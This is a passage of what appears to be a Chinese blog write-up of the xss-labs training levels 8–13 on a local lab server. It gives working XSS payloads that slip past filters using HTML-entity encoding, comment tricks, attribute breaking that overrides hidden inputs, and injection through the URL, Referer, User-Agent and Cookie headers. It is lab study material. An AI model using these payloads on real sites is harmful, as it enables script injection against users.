+<h3 id="解法：HTML-实体编码"><a href="#解法：HTML-实体编码" class="headerlink" title="解法：HTML 实体编码"></a>解法：HTML 实体编码</h3><p><strong>核心原理：</strong> HTML 会自动解码实体编码，但服务器的过滤器不认识！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">你输入：&amp;#106;avascript:alert(1)</span><br><span class="line">    ↓</span><br><span class="line">过滤器：这不是 javascript，放行！</span><br><span class="line">    ↓</span><br><span class="line">浏览器：&amp;#106; → j → javascript:alert(1) → 执行！</span><br></pre></td></tr></table></figure>
+
+<h3 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascr&amp;#x69;pt:alert(1)</span><br></pre></td></tr></table></figure>
+
+<p><code>&amp;#x69;</code> 是 <code>i</code> 的十六进制 HTML 实体编码，打断 <code>script</code> 这个词让过滤器认不出来。</p>
+<h3 id="编码方式对比"><a href="#编码方式对比" class="headerlink" title="编码方式对比"></a>编码方式对比</h3><table>
+<thead>
+<tr>
+<th>编码方式</th>
+<th>格式</th>
+<th>HTML 自动解码？</th>
+<th>能绕过？</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>HTML 十进制</strong></td>
+<td><code>&amp;#106;</code></td>
+<td>✅ 会</td>
+<td>✅ 能</td>
+</tr>
+<tr>
+<td><strong>HTML 十六进制</strong></td>
+<td><code>&amp;#x6a;</code></td>
+<td>✅ 会</td>
+<td>✅ 能</td>
+</tr>
+<tr>
+<td>Base64</td>
+<td>字符串</td>
+<td>❌ 不会</td>
+<td>❌ 不能</td>
+</tr>
+<tr>
+<td>URL 编码</td>
+<td><code>%6a</code></td>
+<td>❌ 不会</td>
+<td>❌ 不能</td>
+</tr>
+</tbody></table>
+<h3 id="踩坑记录-1"><a href="#踩坑记录-1" class="headerlink" title="踩坑记录"></a>踩坑记录</h3><p>我一开始用 <code>&amp;#106;avascript</code> 绕过，但发现 <code>avascript</code> 里仍然包含 <code>script</code> 这个词，被过滤成了 <code>avascr_ipt</code>。</p>
+<p><strong>正确做法：</strong> 编码 <code>script</code> 里面的某个字母（比如 <code>i</code> → <code>&amp;#x69;</code>），让过滤器认不出这个词。</p>
+<hr>
+<h2 id="十、Level-9-——-必须包含检测绕过"><a href="#十、Level-9-——-必须包含检测绕过" class="headerlink" title="十、Level 9 —— 必须包含检测绕过"></a>十、Level 9 —— 必须包含检测绕过</h2><h3 id="新增检测"><a href="#新增检测" class="headerlink" title="新增检测"></a>新增检测</h3><p>Level 9 在 Level 8 的基础上，增加了一个检测：<strong>输入必须包含 <code>http://</code></strong>，否则提示”链接不合法”。</p>
+<h3 id="关键发现"><a href="#关键发现" class="headerlink" title="关键发现"></a>关键发现</h3><p>后端只检查字符串<strong>是否包含</strong> <code>http://</code>，不要求在开头，甚至没有考虑 <code>https://</code>。</p>
+<h3 id="解法：JavaScript-注释"><a href="#解法：JavaScript-注释" class="headerlink" title="解法：JavaScript 注释"></a>解法：JavaScript 注释</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascr&amp;#x69;pt:alert(1)//http://</span><br></pre></td></tr></table></figure>
+
+<h3 id="拆解分析"><a href="#拆解分析" class="headerlink" title="拆解分析"></a>拆解分析</h3><table>
+<thead>
+<tr>
+<th>部分</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>javascr&amp;#x69;pt</code></td>
+<td>用 HTML 实体编码绕过 <code>javascript</code> 过滤</td>
+</tr>
+<tr>
+<td><code>:alert(1)</code></td>
+<td>要执行的 JS 代码</td>
+</tr>
+<tr>
+<td><code>//</code></td>
+<td><strong>JavaScript 单行注释</strong>，后面内容不执行</td>
+</tr>
+<tr>
+<td><code>http://</code></td>
+<td>骗过后端检测，让它以为这是合法链接</td>
+</tr>
+</tbody></table>
+<h3 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">你输入：javascr&amp;#x69;pt:alert(1)//http://</span><br><span class="line">    ↓</span><br><span class="line">后端检查：包含 http:// 吗？✅ 包含！放行！</span><br><span class="line">    ↓</span><br><span class="line">过滤器：javascript？没有！✅ 放行！</span><br><span class="line">    ↓</span><br><span class="line">浏览器解码：javascript:alert(1)//http://</span><br><span class="line">    ↓</span><br><span class="line">执行 JS：alert(1) 执行，//http:// 是注释被忽略</span><br><span class="line">    ↓</span><br><span class="line">点击链接：弹框！🎉</span><br></pre></td></tr></table></figure>
+
+<h3 id="JavaScript-注释知识"><a href="#JavaScript-注释知识" class="headerlink" title="JavaScript 注释知识"></a>JavaScript 注释知识</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 单行注释：后面内容不执行</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="number">1</span>) <span class="comment">// 这里执行，后面忽略</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 多行注释 */</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="number">1</span>) <span class="comment">/* 中间不执行 */</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十一、Level-10-——-隐藏字段注入"><a href="#十一、Level-10-——-隐藏字段注入" class="headerlink" title="十一、Level 10 —— 隐藏字段注入"></a>十一、Level 10 —— 隐藏字段注入</h2><h3 id="新场景"><a href="#新场景" class="headerlink" title="新场景"></a>新场景</h3><p>Level 10 页面上没有明显的输入框，但查看源代码发现有<strong>隐藏表单字段</strong>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_link&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_history&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>type=&quot;hidden&quot;</code> 的字段在页面上看不见，但可以通过 <strong>URL 参数</strong>传值！</p>
+<h3 id="过滤规则-1"><a href="#过滤规则-1" class="headerlink" title="过滤规则"></a>过滤规则</h3><p>测试 <code>t_sort</code> 字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=&quot; &lt;a href=javascript:alert(1)&gt;hack&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)hack/a</span>&quot; <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>处理结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&quot;</code></td>
+<td>✅ 没有被过滤</td>
+</tr>
+<tr>
+<td><code>&lt;</code> <code>&gt;</code></td>
+<td>❌ 被删除</td>
+</tr>
+</tbody></table>
+<h3 id="解法：事件属性-覆盖-type"><a href="#解法：事件属性-覆盖-type" class="headerlink" title="解法：事件属性 + 覆盖 type"></a>解法：事件属性 + 覆盖 type</h3><p><code>&lt;</code> <code>&gt;</code> 被过滤，不能用 HTML 标签，但可以用<strong>事件属性</strong>（不需要尖括号）。</p>
+<p><strong>但还有一个问题：</strong> 元素是 <code>type=&quot;hidden&quot;</code>，隐藏的输入框无法触发 <code>mouseover</code> 或 <code>focus</code> 事件！</p>
+<p><strong>解决方法：</strong> 在 payload 里加一个空的 <code>type</code> 属性，覆盖后面的 <code>type=&quot;hidden&quot;</code>！</p>
+<p>HTML 属性解析规则：<strong>前面的属性优先</strong>，所以 <code>type=&quot;&quot;</code> 会覆盖后面的 <code>type=&quot;hidden&quot;</code>。</p>
+<h3 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=test&amp;t_sort=&quot; onmouseover=javascript:alert(1) type &quot;</span><br></pre></td></tr></table></figure>
+
+<p>注入后：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">onmouseover</span>=<span class="string">javascript:alert(1)</span> <span class="attr">type</span> &quot;&quot; <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line">                                                 ↑ 这个 type 覆盖后面的 hidden！</span><br></pre></td></tr></table></figure>
+
+<p>输入框变成可见的了，鼠标移上去就会弹框！</p>
+<h3 id="关键技巧"><a href="#关键技巧" class="headerlink" title="关键技巧"></a>关键技巧</h3><table>
+<thead>
+<tr>
+<th>问题</th>
+<th>解决方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;</code> <code>&gt;</code> 被过滤</td>
+<td>用事件属性 <code>onmouseover</code></td>
+</tr>
+<tr>
+<td><code>type=&quot;hidden&quot;</code> 无法触发事件</td>
+<td>加 <code>type &quot;&quot;</code> 覆盖成可见</td>
+</tr>
+<tr>
+<td>页面没有输入框</td>
+<td>通过 URL 参数注入隐藏字段</td>
+</tr>
+</tbody></table>
+<h3 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h3><ul>
+<li>隐藏字段虽然看不见，但可以通过 URL 参数控制</li>
+<li><code>type=&quot;hidden&quot;</code> 变成了 <code>type=&quot;&quot;</code>，输入框变成可见的了</li>
+<li>即使元素是 hidden，事件属性依然可以被触发</li>
+</ul>
+<hr>
+<h2 id="十二、Level-11-——-Referer-请求头注入"><a href="#十二、Level-11-——-Referer-请求头注入" class="headerlink" title="十二、Level 11 —— Referer 请求头注入"></a>十二、Level 11 —— Referer 请求头注入</h2><h3 id="新场景-1"><a href="#新场景-1" class="headerlink" title="新场景"></a>新场景</h3><p>Level 11 和 Level 10 类似，也有隐藏表单字段，但这次注入点不同：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_link&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_history&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_ref&quot;</span> <span class="attr">value</span>=<span class="string">&quot;http://127.0.0.1:8888/level11.php&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="关键发现：t-ref-来自-Referer-请求头"><a href="#关键发现：t-ref-来自-Referer-请求头" class="headerlink" title="关键发现：t_ref 来自 Referer 请求头"></a>关键发现：<code>t_ref</code> 来自 Referer 请求头</h3><ul>
+<li><code>t_ref</code> 的值不是来自 URL 参数，而是来自 <strong>HTTP Referer 请求头</strong></li>
+<li>URL 参数 <code>?t_ref=xxx</code> 不会影响 <code>t_ref</code> 的值</li>
+<li>服务器读取的是 HTTP 请求头中的 <code>Referer</code> 字段</li>
+</ul>
+<h3 id="什么是-Referer？"><a href="#什么是-Referer？" class="headerlink" title="什么是 Referer？"></a>什么是 Referer？</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 当前请求的来源页面 URL</span><br></pre></td></tr></table></figure>
+
+<p>当你从页面 A 点击链接跳转到页面 B 时，浏览器会自动在请求头里加上：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://页面A的URL</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>📖 推荐阅读：<a target="_blank" rel="noopener" href="https://www.ruanyifeng.com/blog/2019/06/http-referer.html">HTTP Referer 教程 - 阮一峰的网络日志</a></p>
+</blockquote>
+<blockquote>
+<p>🔤 <strong>冷知识：</strong> Referer 的正确英语拼法应该是 <strong>referrer</strong>（双 r）。由于早期 HTTP 规范的拼写错误，为了保持向后兼容就将错就错了。所以现在网络技术中拼法不统一，HTTP 头里是 <code>Referer</code>（少一个 r），其他规范里可能用的是正确的 <code>Referrer</code>。</p>
+</blockquote>
+<h3 id="过滤规则-2"><a href="#过滤规则-2" class="headerlink" title="过滤规则"></a>过滤规则</h3><table>
+<thead>
+<tr>
+<th>字符</th>
+<th>处理结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&quot;</code></td>
+<td>✅ 没有被过滤</td>
+</tr>
+<tr>
+<td><code>&lt;</code> <code>&gt;</code></td>
+<td>❌ 被删除</td>
+</tr>
+</tbody></table>
+<h3 id="核心思路：只要存在可以自定义的字段，就可以注入"><a href="#核心思路：只要存在可以自定义的字段，就可以注入" class="headerlink" title="核心思路：只要存在可以自定义的字段，就可以注入"></a>核心思路：只要存在可以自定义的字段，就可以注入</h3><p><code>t_ref</code> 的值来自 Referer 请求头，而不是 URL 参数或表单输入。所以我们需要想办法<strong>控制 Referer 的内容</strong>。</p>
+<h3 id="解法一：用-Burp-Suite-修改-Referer（推荐）"><a href="#解法一：用-Burp-Suite-修改-Referer（推荐）" class="headerlink" title="解法一：用 Burp Suite 修改 Referer（推荐）"></a>解法一：用 Burp Suite 修改 Referer（推荐）</h3><p>最直接的方法，用 <strong>Burp Suite</strong> 拦截请求，修改 Referer 头：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>&quot; type=&quot;text&quot; onfocus=javascript:alert(1) autofocus=&quot;</span><br></pre></td></tr></table></figure>
+
+<p>注入后：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_ref&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">onfocus</span>=<span class="string">javascript:alert(1)</span> <span class="attr">autofocus</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>type=&quot;text&quot;</code> → 覆盖 <code>type=&quot;hidden&quot;</code>，输入框变可见</li>
+<li><code>autofocus</code> → 页面加载时自动获得焦点</li>
+<li><code>onfocus</code> → 获得焦点时自动弹框</li>
+</ul>
+<h3 id="解法二：创建恶意-HTML-文件重定向"><a href="#解法二：创建恶意-HTML-文件重定向" class="headerlink" title="解法二：创建恶意 HTML 文件重定向"></a>解法二：创建恶意 HTML 文件重定向</h3><p>不用 Burp Suite 也能做到！原理是：<strong>浏览器跳转时，会自动把当前页面的 URL 作为 Referer 发送给目标页面</strong>。</p>
+<p>所以我们可以创建一个文件名包含 payload 的 HTML 文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件名：&quot; onmouseover=javascript:alert(1) type &quot;.html</span><br></pre></td></tr></table></figure>
+
+<p>文件内容（自动跳转到 Level 11）：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;http://127.0.0.1:8888/level11.php?keyword=test&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>用浏览器打开这个文件，跳转时浏览器会把文件名作为 Referer 发送，服务器就把我们的 payload 塞进了 <code>t_ref</code>！</p>
+<p><strong>对比两种方法：</strong></p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>优点</th>
+<th>缺点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Burp Suite 修改</td>
+<td>简洁直接，灵活</td>
+<td>需要工具</td>
+</tr>
+<tr>
+<td>创建 HTML 文件</td>
+<td>不需要工具</td>
+<td>文件名有特殊字符，某些系统可能不支持</td>
+</tr>
+</tbody></table>
+<h3 id="踩坑记录-2"><a href="#踩坑记录-2" class="headerlink" title="踩坑记录"></a>踩坑记录</h3><p>注入成功后，页面上出现了一个输入框。我尝试在框里输入内容，但发现 <code>t_ref</code> 的值变成了当前页面 URL，而不是我输入的内容。</p>
+<p><strong>原因：</strong> 每次提交表单都是一个新的 HTTP 请求，浏览器会自动设置新的 Referer 为当前页面 URL，覆盖了之前的注入。</p>
+<p><strong>教训：</strong> 在框里输入没用，<code>t_ref</code> 只读取 Referer 请求头，不读取表单输入！</p>
+<hr>
+<h2 id="十三、Level-12-——-User-Agent-请求头注入"><a href="#十三、Level-12-——-User-Agent-请求头注入" class="headerlink" title="十三、Level 12 —— User-Agent 请求头注入"></a>十三、Level 12 —— User-Agent 请求头注入</h2><h3 id="新场景-2"><a href="#新场景-2" class="headerlink" title="新场景"></a>新场景</h3><p>Level 12 和 Level 11 几乎一模一样，也有隐藏表单字段，但这次多了一个 <code>t_ua</code>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_link&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_history&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_ua&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="关键发现：t-ua-来自-User-Agent-请求头"><a href="#关键发现：t-ua-来自-User-Agent-请求头" class="headerlink" title="关键发现：t_ua 来自 User-Agent 请求头"></a>关键发现：<code>t_ua</code> 来自 User-Agent 请求头</h3><p>和 Level 11 的 <code>t_ref</code> 来自 Referer 一样，<code>t_ua</code> 的值来自 <strong>HTTP User-Agent 请求头</strong>——就是浏览器发给服务器的”自我介绍”。</p>
+<h3 id="过滤规则-3"><a href="#过滤规则-3" class="headerlink" title="过滤规则"></a>过滤规则</h3><table>
+<thead>
+<tr>
+<th>字符</th>
+<th>处理结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&quot;</code></td>
+<td>✅ 没有被过滤</td>
+</tr>
+<tr>
+<td><code>&lt;</code> <code>&gt;</code></td>
+<td>❌ 被删除（用 <code>str_replace</code>）</td>
+</tr>
+</tbody></table>
+<p>注意：Level 11 用的是 <code>htmlspecialchars()</code> 转义，Level 12 用的是 <code>str_replace</code> 直接删除，但效果一样——<code>&lt;</code> <code>&gt;</code> 都用不了。</p>
+<h3 id="解法：用-Burp-Suite-修改-User-Agent"><a href="#解法：用-Burp-Suite-修改-User-Agent" class="headerlink" title="解法：用 Burp Suite 修改 User-Agent"></a>解法：用 Burp Suite 修改 User-Agent</h3><p>和 Level 11 同样的思路，用 Burp Suite 拦截请求，修改 User-Agent 头：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&quot; onmouseover=javascript:alert(1) type &quot;</span><br></pre></td></tr></table></figure>
+
+<p>注入后：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_ua&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">onmouseover</span>=<span class="string">javascript:alert(1)</span> <span class="attr">type</span> &quot;&quot; <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>&quot;</code> 闭合 <code>value</code> 属性</li>
+<li><code>onmouseover=javascript:alert(1)</code> → 鼠标移上去弹框</li>
+<li><code>type &quot;</code> → 覆盖后面的 <code>type=&quot;hidden&quot;</code>，输入框变可见</li>
+</ul>
+<p>鼠标移到输入框上，弹框成功！✅</p>
+<h3 id="Level-10-12-对比：同一套路，三个入口"><a href="#Level-10-12-对比：同一套路，三个入口" class="headerlink" title="Level 10-12 对比：同一套路，三个入口"></a>Level 10-12 对比：同一套路，三个入口</h3><table>
+<thead>
+<tr>
+<th>关卡</th>
+<th>注入来源</th>
+<th>隐藏字段</th>
+<th>过滤方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Level 10</td>
+<td>URL 参数 <code>?t_sort=</code></td>
+<td><code>t_sort</code></td>
+<td><code>&lt;&gt;</code> 删除</td>
+</tr>
+<tr>
+<td>Level 11</td>
+<td>Referer 请求头</td>
+<td><code>t_ref</code></td>
+<td><code>htmlspecialchars()</code></td>
+</tr>
+<tr>
+<td>Level 12</td>
+<td>User-Agent 请求头</td>
+<td><code>t_ua</code></td>
+<td><code>&lt;&gt;</code> 删除</td>
+</tr>
+</tbody></table>
+<p><strong>核心思路完全一样：</strong> 闭合 <code>value</code> → 加事件属性 → 覆盖 <code>type=&quot;hidden&quot;</code>。三道题本质上是同一道题，只是换了三个不同的入口。</p>
+<p><strong>启示：</strong> HTTP 请求头中任何用户可控的字段（Referer、User-Agent、Cookie、X-Forwarded-For 等），只要服务器把它输出到页面上，都可能成为 XSS 的注入点！</p>
+<hr>
+<h2 id="十四、Level-13-——-Cookie-注入"><a href="#十四、Level-13-——-Cookie-注入" class="headerlink" title="十四、Level 13 —— Cookie 注入"></a>十四、Level 13 —— Cookie 注入</h2><h3 id="新场景-3"><a href="#新场景-3" class="headerlink" title="新场景"></a>新场景</h3><p>Level 13 和 Level 12 又几乎一模一样，但这次多了一个 <code>t_cook</code>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_link&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_history&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_cook&quot;</span> <span class="attr">value</span>=<span class="string">&quot;call me maybe?&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="关键发现：t-cook-来自-Cookie-请求头"><a href="#关键发现：t-cook-来自-Cookie-请求头" class="headerlink" title="关键发现：t_cook 来自 Cookie 请求头"></a>关键发现：<code>t_cook</code> 来自 Cookie 请求头</h3><p>源码里可以看到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;call me maybe?&quot;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);  <span class="comment">// ← 服务器设置了一个 cookie</span></span><br><span class="line"><span class="variable">$str11</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>];                          <span class="comment">// ← 从 cookie 读取</span></span><br></pre></td></tr></table></figure>
+
+<p>服务器一上来就给你设置了一个名为 <code>user</code> 的 Cookie，值为 <code>call me maybe?</code>，然后把这个值读出来塞进了 <code>t_cook</code> 的 value 里。</p>
+<h3 id="过滤规则-4"><a href="#过滤规则-4" class="headerlink" title="过滤规则"></a>过滤规则</h3><table>
+<thead>
+<tr>
+<th>字符</th>
+<th>处理结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&quot;</code></td>
+<td>✅ 没有被过滤</td>
+</tr>
+<tr>
+<td><code>&lt;</code> <code>&gt;</code></td>
+<td>❌ 被删除（用 <code>str_replace</code>）</td>
+</tr>
+</tbody></table>
+<p>和 Level 12 的过滤方式完全一样。</p>
+<h3 id="解法一：用-F12-修改-Cookie（推荐，更简单！）"><a href="#解法一：用-F12-修改-Cookie（推荐，更简单！）" class="headerlink" title="解法一：用 F12 修改 Cookie（推荐，更简单！）"></a>解法一：用 F12 修改 Cookie（推荐，更简单！）</h3><p>这关比 Level 11、12 更简单——<strong>不用 Burp Suite</strong>，直接用浏览器 F12 就能改 Cookie！</p>
+<ol>
+<li>打开 Level 13，按 <strong>F12</strong> 打开开发者工具</li>
+<li>切到 <strong>Application（应用）</strong> 标签页</li>
+<li>左侧找到 <strong>Cookies</strong> → 选择当前网站</li>
+<li>找到名为 <code>user</code> 的 Cookie，双击它的 <strong>Value</strong> 列</li>
+<li>把值改成我们的 payload：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=javascript:alert(1) type=&quot;</span><br></pre></td></tr></table></figure></li>
+<li>刷新页面，鼠标移到输入框上，弹框成功！✅</li>
+</ol>
+<h3 id="解法二：用-Burp-Suite-修改-Cookie"><a href="#解法二：用-Burp-Suite-修改-Cookie" class="headerlink" title="解法二：用 Burp Suite 修改 Cookie"></a>解法二：用 Burp Suite 修改 Cookie</h3><p>和 Level 12 一样的操作，用 Burp Suite 拦截请求，修改 Cookie 头：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>user=&quot; onmouseover=javascript:alert(1) type=&quot;</span><br></pre></td></tr></table></figure>
+
+<p>注入后：</p>
